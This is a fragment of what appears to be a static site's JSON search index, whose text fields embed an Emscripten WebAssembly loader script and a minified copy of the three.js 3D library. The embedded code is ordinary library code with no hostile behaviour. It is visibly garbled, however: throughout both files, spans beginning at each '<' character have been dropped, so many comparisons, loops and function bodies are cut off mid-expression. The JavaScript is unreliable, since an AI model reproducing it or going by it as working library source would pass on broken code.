Game();"},{"title":"","date":"2019-08-17T13:53:13.615Z","updated":"2019-05-20T16:39:34.000Z","comments":true,"path":"i/wasm/webassembly.js","permalink":"http://yoursite.com/i/wasm/webassembly.js","excerpt":"","text":"var Module=typeof Module!==\"undefined\"?Module:{};var moduleOverrides={};var key;for(key in Module){if(Module.hasOwnProperty(key)){moduleOverrides[key]=Module[key]}}Module[\"arguments\"]=[];Module[\"thisProgram\"]=\"./this.program\";Module[\"quit\"]=function(status,toThrow){throw toThrow};Module[\"preRun\"]=[];Module[\"postRun\"]=[];var ENVIRONMENT_IS_WEB=false;var ENVIRONMENT_IS_WORKER=false;var ENVIRONMENT_IS_NODE=false;var ENVIRONMENT_IS_SHELL=false;ENVIRONMENT_IS_WEB=typeof window===\"object\";ENVIRONMENT_IS_WORKER=typeof importScripts===\"function\";ENVIRONMENT_IS_NODE=typeof process===\"object\"&&typeof require===\"function\"&&!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_WORKER;ENVIRONMENT_IS_SHELL=!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_NODE&&!ENVIRONMENT_IS_WORKER;var scriptDirectory=\"\";function locateFile(path){if(Module[\"locateFile\"]){return Module[\"locateFile\"](path,scriptDirectory)}else{return scriptDirectory+path}}if(ENVIRONMENT_IS_NODE){scriptDirectory=__dirname+\"/\";var nodeFS;var nodePath;Module[\"read\"]=function shell_read(filename,binary){var ret;if(!nodeFS)nodeFS=require(\"fs\");if(!nodePath)nodePath=require(\"path\");filename=nodePath[\"normalize\"](filename);ret=nodeFS[\"readFileSync\"](filename);return binary?ret:ret.toString()};Module[\"readBinary\"]=function readBinary(filename){var ret=Module[\"read\"](filename,true);if(!ret.buffer){ret=new Uint8Array(ret)}assert(ret.buffer);return ret};if(process[\"argv\"].length>1){Module[\"thisProgram\"]=process[\"argv\"][1].replace(/\\\\/g,\"/\")}Module[\"arguments\"]=process[\"argv\"].slice(2);if(typeof module!==\"undefined\"){module[\"exports\"]=Module}process[\"on\"](\"uncaughtException\",function(ex){if(!(ex instanceof ExitStatus)){throw ex}});process[\"on\"](\"unhandledRejection\",abort);Module[\"quit\"]=function(status){process[\"exit\"](status)};Module[\"inspect\"]=function(){return\"[Emscripten Module object]\"}}else if(ENVIRONMENT_IS_SHELL){if(typeof read!=\"undefined\"){Module[\"read\"]=function shell_read(f){return read(f)}}Module[\"readBinary\"]=function readBinary(f){var data;if(typeof readbuffer===\"function\"){return new Uint8Array(readbuffer(f))}data=read(f,\"binary\");assert(typeof data===\"object\");return data};if(typeof scriptArgs!=\"undefined\"){Module[\"arguments\"]=scriptArgs}else if(typeof arguments!=\"undefined\"){Module[\"arguments\"]=arguments}if(typeof quit===\"function\"){Module[\"quit\"]=function(status){quit(status)}}}else if(ENVIRONMENT_IS_WEB||ENVIRONMENT_IS_WORKER){if(ENVIRONMENT_IS_WORKER){scriptDirectory=self.location.href}else if(document.currentScript){scriptDirectory=document.currentScript.src}if(scriptDirectory.indexOf(\"blob:\")!==0){scriptDirectory=scriptDirectory.substr(0,scriptDirectory.lastIndexOf(\"/\")+1)}else{scriptDirectory=\"\"}Module[\"read\"]=function shell_read(url){var xhr=new XMLHttpRequest;xhr.open(\"GET\",url,false);xhr.send(null);return xhr.responseText};if(ENVIRONMENT_IS_WORKER){Module[\"readBinary\"]=function readBinary(url){var xhr=new XMLHttpRequest;xhr.open(\"GET\",url,false);xhr.responseType=\"arraybuffer\";xhr.send(null);return new Uint8Array(xhr.response)}}Module[\"readAsync\"]=function readAsync(url,onload,onerror){var xhr=new XMLHttpRequest;xhr.open(\"GET\",url,true);xhr.responseType=\"arraybuffer\";xhr.onload=function xhr_onload(){if(xhr.status==200||xhr.status==0&&xhr.response){onload(xhr.response);return}onerror()};xhr.onerror=onerror;xhr.send(null)};Module[\"setWindowTitle\"]=function(title){document.title=title}}else{}var out=Module[\"print\"]||(typeof console!==\"undefined\"?console.log.bind(console):typeof print!==\"undefined\"?print:null);var err=Module[\"printErr\"]||(typeof printErr!==\"undefined\"?printErr:typeof console!==\"undefined\"&&console.warn.bind(console)||out);for(key in moduleOverrides){if(moduleOverrides.hasOwnProperty(key)){Module[key]=moduleOverrides[key]}}moduleOverrides=undefined;var STACK_ALIGN=16;function dynamicAlloc(size){var ret=HEAP32[DYNAMICTOP_PTR>>2];var end=ret+size+15&-16;if(end>2]=end}else{return 0}return ret}function getNativeTypeSize(type){switch(type){case\"i1\":case\"i8\":return 1;case\"i16\":return 2;case\"i32\":return 4;case\"i64\":return 8;case\"float\":return 4;case\"double\":return 8;default:{if(type[type.length-1]===\"*\"){return 4}else if(type[0]===\"i\"){var bits=parseInt(type.substr(1));assert(bits%8===0,\"getNativeTypeSize invalid bits \"+bits+\", type \"+type);return bits/8}else{return 0}}}}function warnOnce(text){if(!warnOnce.shown)warnOnce.shown={};if(!warnOnce.shown[text]){warnOnce.shown[text]=1;err(text)}}var asm2wasmImports={\"f64-rem\":function(x,y){return x%y},\"debugger\":function(){debugger}};var jsCallStartIndex=1;var functionPointers=new Array(0);function convertJsFunctionToWasm(func,sig){var typeSection=[1,0,1,96];var sigRet=sig.slice(0,1);var sigParam=sig.slice(1);var typeCodes={\"i\":127,\"j\":126,\"f\":125,\"d\":124};typeSection.push(sigParam.length);for(var i=0;i>0]=value;break;case\"i8\":HEAP8[ptr>>0]=value;break;case\"i16\":HEAP16[ptr>>1]=value;break;case\"i32\":HEAP32[ptr>>2]=value;break;case\"i64\":tempI64=[value>>>0,(tempDouble=value,+Math_abs(tempDouble)>=1?tempDouble>0?(Math_min(+Math_floor(tempDouble/4294967296),4294967295)|0)>>>0:~~+Math_ceil((tempDouble-+(~~tempDouble>>>0))/4294967296)>>>0:0)],HEAP32[ptr>>2]=tempI64[0],HEAP32[ptr+4>>2]=tempI64[1];break;case\"float\":HEAPF32[ptr>>2]=value;break;case\"double\":HEAPF64[ptr>>3]=value;break;default:abort(\"invalid type for setValue: \"+type)}}var ALLOC_NONE=3;function allocate(slab,types,allocator,ptr){var zeroinit,size;if(typeof slab===\"number\"){zeroinit=true;size=slab}else{zeroinit=false;size=slab.length}var singleType=typeof types===\"string\"?types:null;var ret;if(allocator==ALLOC_NONE){ret=ptr}else{ret=[_malloc,stackAlloc,dynamicAlloc][allocator](Math.max(size,singleType?1:types.length))}if(zeroinit){var stop;ptr=ret;assert((ret&3)==0);stop=ret+(size&~3);for(;ptr>2]=0}stop=ret+size;while(ptr>0]=0}return ret}if(singleType===\"i8\"){if(slab.subarray||slab.slice){HEAPU8.set(slab,ret)}else{HEAPU8.set(new Uint8Array(slab),ret)}return ret}var i=0,type,typeSize,previousType;while(i=endIdx))++endPtr;if(endPtr-idx>16&&u8Array.subarray&&UTF8Decoder){return UTF8Decoder.decode(u8Array.subarray(idx,endPtr))}else{var str=\"\";while(idx>10,56320|ch&1023)}}}return str}function UTF8ToString(ptr,maxBytesToRead){return ptr?UTF8ArrayToString(HEAPU8,ptr,maxBytesToRead):\"\"}function stringToUTF8Array(str,outU8Array,outIdx,maxBytesToWrite){if(!(maxBytesToWrite>0))return 0;var startIdx=outIdx;var endIdx=outIdx+maxBytesToWrite-1;for(var i=0;i=55296&&u=endIdx)break;outU8Array[outIdx++]=u}else if(u=endIdx)break;outU8Array[outIdx++]=192|u>>6;outU8Array[outIdx++]=128|u&63}else if(u=endIdx)break;outU8Array[outIdx++]=224|u>>12;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}else{if(outIdx+3>=endIdx)break;outU8Array[outIdx++]=240|u>>18;outU8Array[outIdx++]=128|u>>12&63;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}}outU8Array[outIdx]=0;return outIdx-startIdx}function stringToUTF8(str,outPtr,maxBytesToWrite){return stringToUTF8Array(str,HEAPU8,outPtr,maxBytesToWrite)}function lengthBytesUTF8(str){var len=0;for(var i=0;i=55296&&u2]=DYNAMIC_BASE;function callRuntimeCallbacks(callbacks){while(callbacks.length>0){var callback=callbacks.shift();if(typeof callback==\"function\"){callback();continue}var func=callback.func;if(typeof func===\"number\"){if(callback.arg===undefined){Module[\"dynCall_v\"](func)}else{Module[\"dynCall_vi\"](func,callback.arg)}}else{func(callback.arg===undefined?null:callback.arg)}}}var __ATPRERUN__=[];var __ATINIT__=[];var __ATMAIN__=[];var __ATPOSTRUN__=[];var runtimeInitialized=false;var runtimeExited=false;function preRun(){if(Module[\"preRun\"]){if(typeof Module[\"preRun\"]==\"function\")Module[\"preRun\"]=[Module[\"preRun\"]];while(Module[\"preRun\"].length){addOnPreRun(Module[\"preRun\"].shift())}}callRuntimeCallbacks(__ATPRERUN__)}function ensureInitRuntime(){if(runtimeInitialized)return;runtimeInitialized=true;if(!Module[\"noFSInit\"]&&!FS.init.initialized)FS.init();TTY.init();callRuntimeCallbacks(__ATINIT__)}function preMain(){FS.ignorePermissions=false;callRuntimeCallbacks(__ATMAIN__)}function exitRuntime(){runtimeExited=true}function postRun(){if(Module[\"postRun\"]){if(typeof Module[\"postRun\"]==\"function\")Module[\"postRun\"]=[Module[\"postRun\"]];while(Module[\"postRun\"].length){addOnPostRun(Module[\"postRun\"].shift())}}callRuntimeCallbacks(__ATPOSTRUN__)}function addOnPreRun(cb){__ATPRERUN__.unshift(cb)}function addOnPostRun(cb){__ATPOSTRUN__.unshift(cb)}var Math_abs=Math.abs;var Math_ceil=Math.ceil;var Math_floor=Math.floor;var Math_min=Math.min;var runDependencies=0;var runDependencyWatcher=null;var dependenciesFulfilled=null;function getUniqueRunDependency(id){return id}function addRunDependency(id){runDependencies++;if(Module[\"monitorRunDependencies\"]){Module[\"monitorRunDependencies\"](runDependencies)}}function removeRunDependency(id){runDependencies--;if(Module[\"monitorRunDependencies\"]){Module[\"monitorRunDependencies\"](runDependencies)}if(runDependencies==0){if(runDependencyWatcher!==null){clearInterval(runDependencyWatcher);runDependencyWatcher=null}if(dependenciesFulfilled){var callback=dependenciesFulfilled;dependenciesFulfilled=null;callback()}}}Module[\"preloadedImages\"]={};Module[\"preloadedAudios\"]={};var dataURIPrefix=\"data:application/octet-stream;base64,\";function isDataURI(filename){return String.prototype.startsWith?filename.startsWith(dataURIPrefix):filename.indexOf(dataURIPrefix)===0}var wasmBinaryFile=\"webassembly.wasm\";if(!isDataURI(wasmBinaryFile)){wasmBinaryFile=locateFile(wasmBinaryFile)}function getBinary(){try{if(Module[\"wasmBinary\"]){return new Uint8Array(Module[\"wasmBinary\"])}if(Module[\"readBinary\"]){return Module[\"readBinary\"](wasmBinaryFile)}else{throw\"both async and sync fetching of the wasm failed\"}}catch(err){abort(err)}}function getBinaryPromise(){if(!Module[\"wasmBinary\"]&&(ENVIRONMENT_IS_WEB||ENVIRONMENT_IS_WORKER)&&typeof fetch===\"function\"){return fetch(wasmBinaryFile,{credentials:\"same-origin\"}).then(function(response){if(!response[\"ok\"]){throw\"failed to load wasm binary file at '\"+wasmBinaryFile+\"'\"}return response[\"arrayBuffer\"]()}).catch(function(){return getBinary()})}return new Promise(function(resolve,reject){resolve(getBinary())})}function createWasm(env){var info={\"env\":env,\"global\":{\"NaN\":NaN,Infinity:Infinity},\"global.Math\":Math,\"asm2wasm\":asm2wasmImports};function receiveInstance(instance,module){var exports=instance.exports;Module[\"asm\"]=exports;removeRunDependency(\"wasm-instantiate\")}addRunDependency(\"wasm-instantiate\");if(Module[\"instantiateWasm\"]){try{return Module[\"instantiateWasm\"](info,receiveInstance)}catch(e){err(\"Module.instantiateWasm callback failed with error: \"+e);return false}}function receiveInstantiatedSource(output){receiveInstance(output[\"instance\"])}function instantiateArrayBuffer(receiver){getBinaryPromise().then(function(binary){return WebAssembly.instantiate(binary,info)}).then(receiver,function(reason){err(\"failed to asynchronously prepare wasm: \"+reason);abort(reason)})}if(!Module[\"wasmBinary\"]&&typeof WebAssembly.instantiateStreaming===\"function\"&&!isDataURI(wasmBinaryFile)&&typeof fetch===\"function\"){WebAssembly.instantiateStreaming(fetch(wasmBinaryFile,{credentials:\"same-origin\"}),info).then(receiveInstantiatedSource,function(reason){err(\"wasm streaming compile failed: \"+reason);err(\"falling back to ArrayBuffer instantiation\");instantiateArrayBuffer(receiveInstantiatedSource)})}else{instantiateArrayBuffer(receiveInstantiatedSource)}return{}}Module[\"asm\"]=function(global,env,providedBuffer){env[\"memory\"]=wasmMemory;env[\"table\"]=wasmTable=new WebAssembly.Table({\"initial\":10,\"maximum\":10,\"element\":\"anyfunc\"});env[\"__memory_base\"]=1024;env[\"__table_base\"]=0;var exports=createWasm(env);return exports};var tempDoublePtr=6544;function ___setErrNo(value){if(Module[\"___errno_location\"])HEAP32[Module[\"___errno_location\"]()>>2]=value;return value}var PATH={splitPath:function(filename){var splitPathRe=/^(\\/?|)([\\s\\S]*?)((?:\\.{1,2}|[^\\/]+?|)(\\.[^.\\/]*|))(?:[\\/]*)$/;return splitPathRe.exec(filename).slice(1)},normalizeArray:function(parts,allowAboveRoot){var up=0;for(var i=parts.length-1;i>=0;i--){var last=parts[i];if(last===\".\"){parts.splice(i,1)}else if(last===\"..\"){parts.splice(i,1);up++}else if(up){parts.splice(i,1);up--}}if(allowAboveRoot){for(;up;up--){parts.unshift(\"..\")}}return parts},normalize:function(path){var isAbsolute=path.charAt(0)===\"/\",trailingSlash=path.substr(-1)===\"/\";path=PATH.normalizeArray(path.split(\"/\").filter(function(p){return!!p}),!isAbsolute).join(\"/\");if(!path&&!isAbsolute){path=\".\"}if(path&&trailingSlash){path+=\"/\"}return(isAbsolute?\"/\":\"\")+path},dirname:function(path){var result=PATH.splitPath(path),root=result[0],dir=result[1];if(!root&&!dir){return\".\"}if(dir){dir=dir.substr(0,dir.length-1)}return root+dir},basename:function(path){if(path===\"/\")return\"/\";var lastSlash=path.lastIndexOf(\"/\");if(lastSlash===-1)return path;return path.substr(lastSlash+1)},extname:function(path){return PATH.splitPath(path)[3]},join:function(){var paths=Array.prototype.slice.call(arguments,0);return PATH.normalize(paths.join(\"/\"))},join2:function(l,r){return PATH.normalize(l+\"/\"+r)},resolve:function(){var resolvedPath=\"\",resolvedAbsolute=false;for(var i=arguments.length-1;i>=-1&&!resolvedAbsolute;i--){var path=i>=0?arguments[i]:FS.cwd();if(typeof path!==\"string\"){throw new TypeError(\"Arguments to path.resolve must be strings\")}else if(!path){return\"\"}resolvedPath=path+\"/\"+resolvedPath;resolvedAbsolute=path.charAt(0)===\"/\"}resolvedPath=PATH.normalizeArray(resolvedPath.split(\"/\").filter(function(p){return!!p}),!resolvedAbsolute).join(\"/\");return(resolvedAbsolute?\"/\":\"\")+resolvedPath||\".\"},relative:function(from,to){from=PATH.resolve(from).substr(1);to=PATH.resolve(to).substr(1);function trim(arr){var start=0;for(;start=0;end--){if(arr[end]!==\"\")break}if(start>end)return[];return arr.slice(start,end-start+1)}var fromParts=trim(from.split(\"/\"));var toParts=trim(to.split(\"/\"));var length=Math.min(fromParts.length,toParts.length);var samePartsLength=length;for(var i=0;i0){result=buf.slice(0,bytesRead).toString(\"utf-8\")}else{result=null}}else if(typeof window!=\"undefined\"&&typeof window.prompt==\"function\"){result=window.prompt(\"Input: \");if(result!==null){result+=\"\\n\"}}else if(typeof readline==\"function\"){result=readline();if(result!==null){result+=\"\\n\"}}if(!result){return null}tty.input=intArrayFromString(result,true)}return tty.input.shift()},put_char:function(tty,val){if(val===null||val===10){out(UTF8ArrayToString(tty.output,0));tty.output=[]}else{if(val!=0)tty.output.push(val)}},flush:function(tty){if(tty.output&&tty.output.length>0){out(UTF8ArrayToString(tty.output,0));tty.output=[]}}},default_tty1_ops:{put_char:function(tty,val){if(val===null||val===10){err(UTF8ArrayToString(tty.output,0));tty.output=[]}else{if(val!=0)tty.output.push(val)}},flush:function(tty){if(tty.output&&tty.output.length>0){err(UTF8ArrayToString(tty.output,0));tty.output=[]}}}};var MEMFS={ops_table:null,mount:function(mount){return MEMFS.createNode(null,\"/\",16384|511,0)},createNode:function(parent,name,mode,dev){if(FS.isBlkdev(mode)||FS.isFIFO(mode)){throw new FS.ErrnoError(ERRNO_CODES.EPERM)}if(!MEMFS.ops_table){MEMFS.ops_table={dir:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr,lookup:MEMFS.node_ops.lookup,mknod:MEMFS.node_ops.mknod,rename:MEMFS.node_ops.rename,unlink:MEMFS.node_ops.unlink,rmdir:MEMFS.node_ops.rmdir,readdir:MEMFS.node_ops.readdir,symlink:MEMFS.node_ops.symlink},stream:{llseek:MEMFS.stream_ops.llseek}},file:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr},stream:{llseek:MEMFS.stream_ops.llseek,read:MEMFS.stream_ops.read,write:MEMFS.stream_ops.write,allocate:MEMFS.stream_ops.allocate,mmap:MEMFS.stream_ops.mmap,msync:MEMFS.stream_ops.msync}},link:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr,readlink:MEMFS.node_ops.readlink},stream:{}},chrdev:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr},stream:FS.chrdev_stream_ops}}}var node=FS.createNode(parent,name,mode,dev);if(FS.isDir(node.mode)){node.node_ops=MEMFS.ops_table.dir.node;node.stream_ops=MEMFS.ops_table.dir.stream;node.contents={}}else if(FS.isFile(node.mode)){node.node_ops=MEMFS.ops_table.file.node;node.stream_ops=MEMFS.ops_table.file.stream;node.usedBytes=0;node.contents=null}else if(FS.isLink(node.mode)){node.node_ops=MEMFS.ops_table.link.node;node.stream_ops=MEMFS.ops_table.link.stream}else if(FS.isChrdev(node.mode)){node.node_ops=MEMFS.ops_table.chrdev.node;node.stream_ops=MEMFS.ops_table.chrdev.stream}node.timestamp=Date.now();if(parent){parent.contents[name]=node}return node},getFileDataAsRegularArray:function(node){if(node.contents&&node.contents.subarray){var arr=[];for(var i=0;i=newCapacity)return;var CAPACITY_DOUBLING_MAX=1024*1024;newCapacity=Math.max(newCapacity,prevCapacity*(prevCapacity0)node.contents.set(oldContents.subarray(0,node.usedBytes),0);return},resizeFileStorage:function(node,newSize){if(node.usedBytes==newSize)return;if(newSize==0){node.contents=null;node.usedBytes=0;return}if(!node.contents||node.contents.subarray){var oldContents=node.contents;node.contents=new Uint8Array(new ArrayBuffer(newSize));if(oldContents){node.contents.set(oldContents.subarray(0,Math.min(newSize,node.usedBytes)))}node.usedBytes=newSize;return}if(!node.contents)node.contents=[];if(node.contents.length>newSize)node.contents.length=newSize;else while(node.contents.length=stream.node.usedBytes)return 0;var size=Math.min(stream.node.usedBytes-position,length);if(size>8&&contents.subarray){buffer.set(contents.subarray(position,position+size),offset)}else{for(var i=0;i"},{"title":"","date":"2019-08-17T13:25:24.612Z","updated":"2019-08-17T13:07:56.000Z","comments":true,"path":"i/js/three.min.js","permalink":"http://yoursite.com/i/js/three.min.js","excerpt":"","text":"// threejs.org/license (function(l,ya){\"object\"===typeof exports&&\"undefined\"!==typeof module?ya(exports):\"function\"===typeof define&&define.amd?define([\"exports\"],ya):ya(l.THREE={})})(this,function(l){function ya(){}function z(a,b){this.x=a||0;this.y=b||0}function I(){this.elements=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1];0this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);return this},negate:function(){this.x=-this.x;this.y=-this.y;this.z=-this.z;return this},dot:function(a){return this.x*a.x+this.y* a.y+this.z*a.z},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},manhattanLength:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},normalize:function(){return this.divideScalar(this.length()||1)},setLength:function(a){return this.normalize().multiplyScalar(a)},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-this.z)*b;return this},lerpVectors:function(a, b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},cross:function(a,b){return void 0!==b?(console.warn(\"THREE.Vector3: .cross() now only accepts one argument. Use .crossVectors( a, b ) instead.\"),this.crossVectors(a,b)):this.crossVectors(this,a)},crossVectors:function(a,b){var c=a.x,d=a.y;a=a.z;var e=b.x,f=b.y;b=b.z;this.x=d*b-a*f;this.y=a*e-c*b;this.z=c*f-d*e;return this},projectOnVector:function(a){var b=a.dot(this)/a.lengthSq();return this.copy(a).multiplyScalar(b)},projectOnPlane:function(){var a= new p;return function(b){a.copy(this).projectOnVector(b);return this.sub(a)}}(),reflect:function(){var a=new p;return function(b){return this.sub(a.copy(b).multiplyScalar(2*this.dot(b)))}}(),angleTo:function(a){a=this.dot(a)/Math.sqrt(this.lengthSq()*a.lengthSq());return Math.acos(H.clamp(a,-1,1))},distanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x,c=this.y-a.y;a=this.z-a.z;return b*b+c*c+a*a},manhattanDistanceTo:function(a){return Math.abs(this.x- a.x)+Math.abs(this.y-a.y)+Math.abs(this.z-a.z)},setFromSpherical:function(a){var b=Math.sin(a.phi)*a.radius;this.x=b*Math.sin(a.theta);this.y=Math.cos(a.phi)*a.radius;this.z=b*Math.cos(a.theta);return this},setFromCylindrical:function(a){this.x=a.radius*Math.sin(a.theta);this.y=a.y;this.z=a.radius*Math.cos(a.theta);return this},setFromMatrixPosition:function(a){a=a.elements;this.x=a[12];this.y=a[13];this.z=a[14];return this},setFromMatrixScale:function(a){var b=this.setFromMatrixColumn(a,0).length(), c=this.setFromMatrixColumn(a,1).length();a=this.setFromMatrixColumn(a,2).length();this.x=b;this.y=c;this.z=a;return this},setFromMatrixColumn:function(a,b){return this.fromArray(a.elements,4*b)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;return a},fromBufferAttribute:function(a,b,c){void 0!== c&&console.warn(\"THREE.Vector3: offset has been removed from .fromBufferAttribute().\");this.x=a.getX(b);this.y=a.getY(b);this.z=a.getZ(b);return this}});Object.assign(ra.prototype,{isMatrix3:!0,set:function(a,b,c,d,e,f,g,h,k){var m=this.elements;m[0]=a;m[1]=d;m[2]=g;m[3]=b;m[4]=e;m[5]=h;m[6]=c;m[7]=f;m[8]=k;return this},identity:function(){this.set(1,0,0,0,1,0,0,0,1);return this},clone:function(){return(new this.constructor).fromArray(this.elements)},copy:function(a){var b=this.elements;a=a.elements; b[0]=a[0];b[1]=a[1];b[2]=a[2];b[3]=a[3];b[4]=a[4];b[5]=a[5];b[6]=a[6];b[7]=a[7];b[8]=a[8];return this},setFromMatrix4:function(a){a=a.elements;this.set(a[0],a[4],a[8],a[1],a[5],a[9],a[2],a[6],a[10]);return this},applyToBufferAttribute:function(){var a=new p;return function(b){for(var c=0,d=b.count;cc;c++)if(b[c]!==a[c])return!1;return!0},fromArray:function(a,b){void 0===b&&(b=0);for(var c=0;9>c;c++)this.elements[c]=a[c+b];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);var c=this.elements;a[b]=c[0];a[b+1]=c[1]; a[b+2]=c[2];a[b+3]=c[3];a[b+4]=c[4];a[b+5]=c[5];a[b+6]=c[6];a[b+7]=c[7];a[b+8]=c[8];return a}});var eb={getDataURL:function(a){if(a instanceof HTMLCanvasElement)var b=a;else{\"undefined\"!==typeof OffscreenCanvas?b=new OffscreenCanvas(a.width,a.height):(b=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\"),b.width=a.width,b.height=a.height);var c=b.getContext(\"2d\");a instanceof ImageData?c.putImageData(a,0,0):c.drawImage(a,0,0,a.width,a.height)}return 2048a.y||1a.y?0:1;break;case 1002:a.y=1===Math.abs(Math.floor(a.y)%2)?Math.ceil(a.y)-a.y:a.y-Math.floor(a.y)}this.flipY&&(a.y=1-a.y)}}});Object.defineProperty(T.prototype,\"needsUpdate\",{set:function(a){!0===a&&this.version++}});Object.assign(V.prototype,{isVector4:!0,set:function(a,b,c,d){this.x=a;this.y= b;this.z=c;this.w=d;return this},setScalar:function(a){this.w=this.z=this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setW:function(a){this.w=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;case 3:this.w=b;break;default:throw Error(\"index is out of range: \"+a);}return this},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y; case 2:return this.z;case 3:return this.w;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y,this.z,this.w)},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;this.w=void 0!==a.w?a.w:1;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;this.z+=a.z;this.w+=a.w;return this},addScalar:function(a){this.x+= a;this.y+=a;this.z+=a;this.w+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;this.w=a.w+b.w;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;this.z+=a.z*b;this.w+=a.w*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;this.z-=a.z;this.w-=a.w;return this},subScalar:function(a){this.x-=a;this.y-= a;this.z-=a;this.w-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=a.z-b.z;this.w=a.w-b.w;return this},multiplyScalar:function(a){this.x*=a;this.y*=a;this.z*=a;this.w*=a;return this},applyMatrix4:function(a){var b=this.x,c=this.y,d=this.z,e=this.w;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d+a[12]*e;this.y=a[1]*b+a[5]*c+a[9]*d+a[13]*e;this.z=a[2]*b+a[6]*c+a[10]*d+a[14]*e;this.w=a[3]*b+a[7]*c+a[11]*d+a[15]*e;return this},divideScalar:function(a){return this.multiplyScalar(1/ a)},setAxisAngleFromQuaternion:function(a){this.w=2*Math.acos(a.w);var b=Math.sqrt(1-a.w*a.w);1E-4>b?(this.x=1,this.z=this.y=0):(this.x=a.x/b,this.y=a.y/b,this.z=a.z/b);return this},setAxisAngleFromRotationMatrix:function(a){a=a.elements;var b=a[0];var c=a[4];var d=a[8],e=a[1],f=a[5],g=a[9];var h=a[2];var k=a[6];var m=a[10];if(.01>Math.abs(c-e)&&.01>Math.abs(d-h)&&.01>Math.abs(g-k)){if(.1>Math.abs(c+e)&&.1>Math.abs(d+h)&&.1>Math.abs(g+k)&&.1>Math.abs(b+f+m-3))return this.set(1,0,0,0),this;a=Math.PI; b=(b+1)/2;f=(f+1)/2;m=(m+1)/2;c=(c+e)/4;d=(d+h)/4;g=(g+k)/4;b>f&&b>m?.01>b?(k=0,c=h=.707106781):(k=Math.sqrt(b),h=c/k,c=d/k):f>m?.01>f?(k=.707106781,h=0,c=.707106781):(h=Math.sqrt(f),k=c/h,c=g/h):.01>m?(h=k=.707106781,c=0):(c=Math.sqrt(m),k=d/c,h=g/c);this.set(k,h,c,a);return this}a=Math.sqrt((k-g)*(k-g)+(d-h)*(d-h)+(e-c)*(e-c));.001>Math.abs(a)&&(a=1);this.x=(k-g)/a;this.y=(d-h)/a;this.z=(e-c)/a;this.w=Math.acos((b+f+m-1)/2);return this},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y, a.y);this.z=Math.min(this.z,a.z);this.w=Math.min(this.w,a.w);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);this.z=Math.max(this.z,a.z);this.w=Math.max(this.w,a.w);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));this.z=Math.max(a.z,Math.min(b.z,this.z));this.w=Math.max(a.w,Math.min(b.w,this.w));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new V,b=new V);a.set(c, c,c,c);b.set(d,d,d,d);return this.clamp(a,b)}}(),clampLength:function(a,b){var c=this.length();return this.divideScalar(c||1).multiplyScalar(Math.max(a,Math.min(b,c)))},floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);this.z=Math.floor(this.z);this.w=Math.floor(this.w);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);this.z=Math.ceil(this.z);this.w=Math.ceil(this.w);return this},round:function(){this.x=Math.round(this.x);this.y=Math.round(this.y); this.z=Math.round(this.z);this.w=Math.round(this.w);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);this.w=0>this.w?Math.ceil(this.w):Math.floor(this.w);return this},negate:function(){this.x=-this.x;this.y=-this.y;this.z=-this.z;this.w=-this.w;return this},dot:function(a){return this.x*a.x+this.y*a.y+this.z*a.z+this.w*a.w},lengthSq:function(){return this.x* this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},manhattanLength:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},normalize:function(){return 